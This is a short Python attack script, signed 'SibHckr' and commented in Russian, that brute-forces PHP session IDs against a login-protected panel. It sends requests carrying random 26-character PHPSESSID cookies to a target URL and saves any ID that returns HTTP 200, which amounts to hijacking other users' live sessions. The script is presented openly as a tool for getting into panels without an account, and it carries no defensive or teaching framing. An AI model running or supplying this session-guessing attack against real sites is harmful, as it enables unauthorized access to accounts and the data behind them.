#sessid bruter by SibHckr
from bs4 import BeautifulSoup
from threading import Thread
import requests
import random
import string

url = "" #сюда url на авторизованную панель, куда без рега не попасть
attempt = 0

def get_title(text):
    try:
        soup = BeautifulSoup(text, 'html.parser')
        title_tag = soup.title
        if title_tag:
            title = title_tag.string
            print(title)
        else:
            pass
    except Exception as e:
        print(e)

def write(text):
    f = open("walid_sess.txt", mode="a")
    f.write(text + "\n")
    f.close()

def fake_sessid(length):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choices(letters_and_digits, k=length))

def login():
    global attempt
    while True:
        PHPSESSID = fake_sessid(26).lower()
        session = requests.Session()
        session.cookies['PHPSESSID'] = PHPSESSID
        print("trying with session: " + PHPSESSID + ", attempt: " + str(attempt))
        try:
            req = session.get(url, allow_redirects=False)
            get_title(req.text)
            attempt = attempt+1
            if req.status_code == 200:
                print("Pimp:" + PHPSESSID)
                write(PHPSESSID)
            elif req.status_code >= 300 and req.status_code < 400:
                pass #редиры отсекаются
            else:
                pass
        except requests.exceptions.RequestException as e:
            pass
            #print(e)

for thr in range(100):
    Thread(target=login()).start()